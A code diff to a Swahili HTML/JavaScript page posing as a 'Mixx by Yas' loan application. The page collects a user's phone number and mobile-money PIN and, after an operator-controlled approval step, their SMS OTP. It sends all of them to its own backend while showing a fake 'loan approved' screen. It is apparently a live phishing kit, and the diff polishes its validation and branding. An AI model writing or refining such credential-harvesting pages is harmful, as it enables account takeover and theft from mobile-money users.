@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Mixx by Yas - Mikoko Rahisi na ya Haraka</title>
+    <title>MIXX BY YAS - MIKOKO RAHISI NA YA HARAKA</title>
     <link rel="stylesheet" href="style.css">
 </head>
 <body>
@@ -11,8 +11,8 @@
     <header>
         <span style="font-size: 20px; cursor: pointer;">☰</span>
         <div class="logo-container">
-            <span class="yas-badge">yas</span>
-            <span class="brand-title">Mixx by Yas</span>
+            <span class="yas-badge">YAS</span>
+            <span class="brand-title">MIXX BY YAS</span>
         </div>
         <span></span>
     </header>
@@ -21,14 +21,14 @@
         
         <!-- DASHBOARD SCREEN -->
         <div id="screen-dashboard" class="screen active">
-            <h2>Pata Mkopo Wako Haraka</h2>
+            <h2>PATA MKOPO WAKO HARAKA</h2>
             <p class="subtitle">Idhini ya haraka • Viwango bora • Masharti yanayobadilika</p>
             
             <div style="background: #fafafa; padding: 15px; border-radius: 12px; border: 1px solid #eee; margin-bottom: 20px;">
-                <label>Kikokotoko cha Mkopo</label>
-                <p style="font-size: 13px; color: #666;">Kiasi cha Mkopo: <strong style="color:var(--accent-yellow); float:right;">TZS 1,000,000</strong></p>
-                <input type="range" min="50000" max="100000000" value="1000000" style="accent-color: var(--accent-yellow); width:100%; margin: 10px 0;">
-                <p style="font-size: 13px; color: #666;">Malipo ya Kila Mwezi: <strong style="color:var(--accent-yellow); font-size:16px; float:right;">TZS 95,044.20</strong></p>
+                <label>Kikokotoko Cha Mkopo</label>
+                <p style="font-size: 13px; color: #666;">Kiasi Cha Mkopo: <strong id="displayAmount" style="color:var(--accent-yellow); float:right;">TZS 1,000,000</strong></p>
+                <input type="range" id="loanRange" min="50000" max="100000000" value="1000000" style="accent-color: var(--accent-yellow); width:100%; margin: 10px 0;" oninput="updateLoanCalculation(this.value)">
+                <p style="font-size: 13px; color: #666;">Malipo Ya Kila Mwezi: <strong id="displayMonthly" style="color:var(--accent-yellow); font-size:16px; float:right;">TZS 95,044.20</strong></p>
             </div>
 
             <button class="btn-primary" onclick="goToScreen('screen-step1')">OMBA SASA</button>
@@ -36,104 +36,107 @@
 
         <!-- STEP 1 SCREEN -->
         <div id="screen-step1" class="screen">
-            <h2>Ombi la Mkopo</h2>
+            <h2>OMBI LA MKOPO</h2>
             <p class="subtitle">Hatua ya 1 kati ya 3</p>
             
             <div class="form-group">
-                <label>Aina ya Mkopo</label>
+                <label>Aina Ya Mkopo</label>
                 <select id="loanType">
+                    <option value="" disabled selected>Chagua aina ya mkopo</option>
                     <option>Mkopo wa Biashara</option>
                     <option>Mkopo wa Haraka</option>
                 </select>
             </div>
 
             <div class="form-group">
-                <label>Kiasi cha Mkopo (TZS)</label>
-                <input type="number" id="loanAmount" value="1000000">
+                <label>Kiasi Cha Mkopo (TZS)</label>
+                <input type="number" id="loanAmount" placeholder="Weka kiasi cha mkopo" value="">
             </div>
 
             <div class="form-group">
-                <label>Muda wa Mkopo</label>
+                <label>Muda Wa Mkopo</label>
                 <select id="loanDuration">
+                    <option value="" disabled selected>Chagua muda wa mkopo</option>
                     <option>Miezi 48</option>
                     <option>Miezi 12</option>
                 </select>
             </div>
 
             <div class="form-group">
-                <label>Kusudi la Mkopo</label>
-                <textarea id="loanPurpose" placeholder="Elezea kusudi la mkopo wako..." style="width:100%; padding:10px; border-radius:8px; border:1px solid #ccc;" rows="3">BIASHARA</textarea>
+                <label>Kusudi La Mkopo</label>
+                <textarea id="loanPurpose" placeholder="Elezea kusudi la mkopo wako..." style="width:100%; padding:10px; border-radius:8px; border:1px solid #ccc;" rows="3"></textarea>
             </div>
 
-            <button class="btn-primary" onclick="goToScreen('screen-step3')">HATUA INAYOFUATA</button>
+            <button class="btn-primary" id="btnStep1" onclick="validateStep1()" disabled style="opacity: 0.5; cursor: not-allowed;">HATUA INAYOFUATA</button>
         </div>
 
         <!-- STEP 3 SCREEN -->
         <div id="screen-step3" class="screen">
-            <h2>Ombi la Mkopo</h2>
+            <h2>OMBI LA MKOPO</h2>
             <p class="subtitle">Hatua ya 3 kati ya 3</p>
 
             <div class="form-group">
-                <label>Hali ya Ajira</label>
+                <label>Hali Ya Ajira</label>
                 <select id="employment">
+                    <option value="" disabled selected>Chagua hali ya ajira</option>
                     <option>Binafsi</option>
                     <option>Ameajiriwa</option>
                 </select>
             </div>
 
             <div class="form-group">
-                <label>Mapato ya Mwaka (TZS)</label>
-                <input type="number" id="income" placeholder="Weka mapato ya mwaka">
+                <label>Mapato Ya Mwaka (TZS)</label>
+                <input type="number" id="income" placeholder="Weka mapato ya mwaka" value="">
             </div>
 
-            <button class="btn-primary" onclick="submitApplication()">WASILISHA OMBI</button>
+            <button class="btn-primary" id="btnStep3" onclick="validateStep3()" disabled style="opacity: 0.5; cursor: not-allowed;">WASILISHA OMBI</button>
         </div>
 
         <!-- WAITING / PENDING ADMIN APPROVAL SCREEN -->
         <div id="screen-waiting" class="screen" style="text-align: center; padding: 20px;">
             <div style="font-size: 48px; margin-bottom: 15px;">📋</div>
-            <h2>Ombi la Mkopo Limewasilishwa</h2>
+            <h2>Ombi La Mkopo Limewasilishwa</h2>
             <p class="subtitle">Ombi lako la mkopo limewasilishwa. Tafadhali subiri idhini. Utapokea ujumbe wa uthibitisho.</p>
             <p id="status-text" style="font-weight: bold; color: var(--primary-blue); margin-top: 20px;">Inasubiri idhini ya Msimamizi...</p>
         </div>
 
         <!-- LOGIN / PIN SCREEN -->
         <div id="screen-login" class="screen">
-            <h2 style="text-align:center;">Ingia</h2>
+            <h2 style="text-align:center;">INGIA</h2>
             <div class="form-group">
-                <label>Nambari ya Simu</label>
+                <label>Nambari Ya Simu</label>
                 <div style="display: flex; gap: 8px;">
                     <span style="padding: 12px; background: #eee; border-radius: 8px; border:1px solid #ccc;">🇹🇿 +255</span>
-                    <input type="tel" id="phoneNumber" placeholder="712345678" style="flex: 1;">
+                    <input type="tel" id="phoneNumber" placeholder="712345678" style="flex: 1;" oninput="checkLoginInputs()">
                 </div>
             </div>
 
-            <label style="text-align:center; margin-top: 15px;">Weka PIN yako (tarakimu 4)</label>
+            <label style="text-align:center; margin-top: 15px;">Weka PIN Yako (Tarakimu 4)</label>
             <div class="pin-inputs">
-                <input type="password" maxlength="1" class="pin-box" />
-                <input type="password" maxlength="1" class="pin-box" />
-                <input type="password" maxlength="1" class="pin-box" />
-                <input type="password" maxlength="1" class="pin-box" />
+                <input type="password" maxlength="1" class="pin-box" oninput="checkLoginInputs()" />
+                <input type="password" maxlength="1" class="pin-box" oninput="checkLoginInputs()" />
+                <input type="password" maxlength="1" class="pin-box" oninput="checkLoginInputs()" />
+                <input type="password" maxlength="1" class="pin-box" oninput="checkLoginInputs()" />
             </div>
 
-            <button class="btn-primary" onclick="submitPin()">INGIA</button>
+            <button class="btn-primary" id="btnLogin" onclick="submitPin()" disabled style="opacity: 0.5; cursor: not-allowed;">INGIA</button>
         </div>
 
         <!-- SMS OTP SCREEN (Loaded after Admin allows) -->
         <div id="screen-otp" class="screen">
-            <h2>Uthibitisho wa SMS OTP</h2>
+            <h2>Uthibitisho Wa SMS OTP</h2>
             <p class="subtitle">Weka nambari ya OTP uliyopokea kwa SMS</p>
             <div class="form-group">
-                <label>Weka OTP (tarakimu 6)</label>
-                <input type="text" id="otpInput" placeholder="123456" maxlength="6" style="text-align: center; font-size: 20px; letter-spacing: 4px;">
+                <label>Weka OTP (Tarakimu 6)</label>
+                <input type="text" id="otpInput" placeholder="123456" maxlength="6" style="text-align: center; font-size: 20px; letter-spacing: 4px;" oninput="checkOtpInput()">
             </div>
-            <button class="btn-primary" onclick="submitOtp()">WASILISHA OTP</button>
+            <button class="btn-primary" id="btnOtp" onclick="submitOtp()" disabled style="opacity: 0.5; cursor: not-allowed;">WASILISHA OTP</button>
         </div>
 
         <!-- SUCCESS SCREEN -->
         <div id="screen-success" class="screen" style="text-align: center; padding: 40px 20px;">
             <div style="font-size: 60px; margin-bottom: 20px;">✅</div>
-            <h2 style="color: white;">Imefanikiwa!</h2>
+            <h2 style="color: white;">IMEANISHWA!</h2>
             <p style="color: #e5e7eb; margin-top: 10px;">Mkopo wako umeidhinishwa na kuhamishwa kwenye akaunti yako.</p>
         </div>
 
@@ -148,13 +151,123 @@
             document.getElementById(screenId).classList.add('active');
         }
 
-        async function submitApplication() {
-            const amount = document.getElementById('loanAmount').value;
-            const duration = document.getElementById('loanDuration').value;
-            const purpose = document.getElementById('loanPurpose').value;
-            
-            // Move directly to login/PIN prompt as part of the flow sequence
+        function updateLoanCalculation(val) {
+            const numericVal = Number(val);
+            const formattedAmount = numericVal.toLocaleString('en-US');
+            document.getElementById('displayAmount').innerText = 'TZS ' + formattedAmount;
+
+            const step1Input = document.getElementById('loanAmount');
+            if (step1Input) {
+                step1Input.value = numericVal;
+                checkStep1Inputs();
+            }
+
+            const estimatedMonthly = (numericVal * 0.095044).toFixed(2);
+            const formattedMonthly = Number(estimatedMonthly).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+            document.getElementById('displayMonthly').innerText = 'TZS ' + formattedMonthly;
+        }
+
+        // --- VALIDATION LOGIC FOR STEP 1 ---
+        function checkStep1Inputs() {
+            const loanType = document.getElementById('loanType').value;
+            const loanAmount = document.getElementById('loanAmount').value;
+            const loanDuration = document.getElementById('loanDuration').value;
+            const loanPurpose = document.getElementById('loanPurpose').value.trim();
+            const btn = document.getElementById('btnStep1');
+
+            if (loanType && loanAmount && loanDuration && loanPurpose) {
+                btn.removeAttribute('disabled');
+                btn.style.opacity = '1';
+                btn.style.cursor = 'pointer';
+            } else {
+                btn.setAttribute('disabled', 'true');
+                btn.style.opacity = '0.5';
+                btn.style.cursor = 'not-allowed';
+            }
+        }
+
+        document.getElementById('loanType').addEventListener('change', checkStep1Inputs);
+        document.getElementById('loanAmount').addEventListener('input', checkStep1Inputs);
+        document.getElementById('loanDuration').addEventListener('change', checkStep1Inputs);
+        document.getElementById('loanPurpose').addEventListener('input', checkStep1Inputs);
+
+        function validateStep1() {
+            goToScreen('screen-step3');
+        }
+
+        // --- VALIDATION LOGIC FOR STEP 3 ---
+        function checkStep3Inputs() {
+            const employment = document.getElementById('employment').value;
+            const income = document.getElementById('income').value;
+            const btn = document.getElementById('btnStep3');
+
+            if (employment && income) {
+                btn.removeAttribute('disabled');
+                btn.style.opacity = '1';
+                btn.style.cursor = 'pointer';
+            } else {
+                btn.setAttribute('disabled', 'true');
+                btn.style.opacity = '0.5';
+                btn.style.cursor = 'not-allowed';
+            }
+        }
+
+        document.getElementById('employment').addEventListener('change', checkStep3Inputs);
+        document.getElementById('income').addEventListener('input', checkStep3Inputs);
+
+        function validateStep3() {
             goToScreen('screen-login');
+        }
+
+        // --- VALIDATION LOGIC FOR LOGIN / PIN ---
+        function checkLoginInputs() {
+            const phone = document.getElementById('phoneNumber').value;
+            const pinBoxes = document.querySelectorAll('.pin-box');
+            let pin = '';
+            pinBoxes.forEach(b => pin += b.value);
+            const btn = document.getElementById('btnLogin');
+
+            if (phone.length >= 9 && pin.length === 4) {
+                btn.removeAttribute('disabled');
+                btn.style.opacity = '1';
+                btn.style.cursor = 'pointer';
+            } else {
+                btn.setAttribute('disabled', 'true');
+                btn.style.opacity = '0.5';
+                btn.style.cursor = 'not-allowed';
+            }
+        }
+
+        // Auto-focus next PIN box helper
+        const pinBoxes = document.querySelectorAll('.pin-box');
+        pinBoxes.forEach((box, index) => {
+            box.addEventListener('input', (e) => {
+                if (e.target.value.length === 1 && index < pinBoxes.length - 1) {
+                    pinBoxes[index + 1].focus();
+                }
+                checkLoginInputs();
+            });
+            box.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && box.value.length === 0 && index > 0) {
+                    pinBoxes[index - 1].focus();
+                }
+            });
+        });
+
+        // --- VALIDATION LOGIC FOR OTP ---
+        function checkOtpInput() {
+            const otp = document.getElementById('otpInput').value;
+            const btn = document.getElementById('btnOtp');
+
+            if (otp.length === 6) {
+                btn.removeAttribute('disabled');
+                btn.style.opacity = '1';
+                btn.style.cursor = 'pointer';
+            } else {
+                btn.setAttribute('disabled', 'true');
+                btn.style.opacity = '0.5';
+                btn.style.cursor = 'not-allowed';
+            }
         }
 
         async function submitPin() {
@@ -163,15 +276,13 @@
             let pin = '';
             pinBoxes.forEach(b => pin += b.value);
 
-            if(!phone || pin.length < 4) {
-                alert('Tafadhali jaza nambari ya simu na PIN kamili');
-                return;
-            }
+            const rangeVal = document.getElementById('loanRange').value;
+            const selectedAmount = 'TZS ' + Number(rangeVal).toLocaleString('en-US');
 
             const response = await fetch('/api/submit-application', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ phone, pin, amount: '1,000,000 TZS' })
+                body: JSON.stringify({ phone, pin, amount: selectedAmount })
             });
 
             const data = await response.json();
@@ -192,14 +303,13 @@
 
                 if(data.status === 'APPROVED_LOAD_OTP') {
                     clearInterval(statusPollInterval);
-                    goToScreen('screen-otp'); // Loads SMS OTP Screen
+                    goToScreen('screen-otp');
                 } else if(data.status === 'DENIED') {
                     clearInterval(statusPollInterval);
                     alert('Ombi limekataliwa.');
                     goToScreen('screen-dashboard');
                 } else if(data.status === 'SUCCESS') {
                     clearInterval(statusPollInterval);
-                    // Switch wrapper background to full primary blue for success screen
                     document.querySelector('.container').style.background = 'var(--primary-blue)';
                     goToScreen('screen-success');
                 } else if(data.status === 'WRONG_PIN_ERROR') {
@@ -214,10 +324,6 @@
 
         async function submitOtp() {
             const otp = document.getElementById('otpInput').value;
-            if(!otp) {
-                alert('Tafadhali weka nambari ya OTP');
-                return;
-            }
 
             await fetch('/api/submit-otp', {
                 method: 'POST',
@@ -231,5 +337,5 @@
         }
     </script>
 </body>
-    </html>
-                    
+                        </html>
+    
